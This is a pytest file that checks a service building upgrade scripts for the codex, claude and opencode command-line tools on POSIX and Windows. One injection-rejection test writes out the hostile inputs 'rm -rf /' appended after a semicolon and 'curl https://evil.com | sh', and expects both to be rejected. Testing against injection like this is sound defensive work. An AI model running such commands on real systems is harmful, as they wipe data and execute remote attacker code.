"""Tests for action_service: remote upgrade and injection prevention."""

from __future__ import annotations

import pytest

from agent_fleet.remotes.probe import PATH_BOOTSTRAP
from agent_fleet.services.action_service import (
    UPGRADE_RULES,
    WIN_PATH_BOOTSTRAP,
    build_upgrade_script,
    get_upgrade_task,
)


def test_build_upgrade_script_posix_npm():
    script = build_upgrade_script("codex", "posix")
    assert PATH_BOOTSTRAP in script
    assert "npm install -g @openai/codex@latest" in script


def test_build_upgrade_script_posix_claude():
    script = build_upgrade_script("claude", "posix")
    assert "claude update" in script
    assert "@anthropic-ai/claude-code@latest" in script


def test_build_upgrade_script_posix_opencode():
    script = build_upgrade_script("opencode", "posix")
    assert "opencode upgrade" in script
    assert "npm install -g opencode-ai@latest" in script


def test_build_upgrade_script_windows_opencode():
    script = build_upgrade_script("opencode", "windows")
    assert "opencode.cmd upgrade" in script
    assert "opencode-ai@latest" in script


def test_build_upgrade_script_windows():
    script = build_upgrade_script("codex", "windows")
    assert "npm.cmd install -g @openai/codex@latest" in script
    assert "$ProgressPreference = \"SilentlyContinue\"" in script
    assert "AppData\\Roaming\\npm" in script
    # Windows doesn't use the POSIX bash PATH_BOOTSTRAP
    assert PATH_BOOTSTRAP not in script


def test_build_upgrade_script_windows_claude():
    script = build_upgrade_script("claude", "windows")
    assert "claude.cmd update" in script
    assert "@anthropic-ai/claude-code@latest" in script


def test_build_upgrade_script_injection_rejected():
    with pytest.raises(ValueError, match="does not support automated upgrades"):
        build_upgrade_script("malicious_agent; rm -rf /", "posix")

    with pytest.raises(ValueError):
        build_upgrade_script("curl https://evil.com | sh", "posix")


def test_get_upgrade_task_unknown():
    assert get_upgrade_task("nonexistent") is None


def test_start_batch_upgrade_empty_and_dedup():
    from agent_fleet.services.action_service import start_batch_upgrade

    # Empty list
    assert start_batch_upgrade([]) == []

    # Nonexistent IDs skipped gracefully without crashing
    tasks = start_batch_upgrade(["fake_1", "fake_2", "fake_1"])
    assert tasks == []

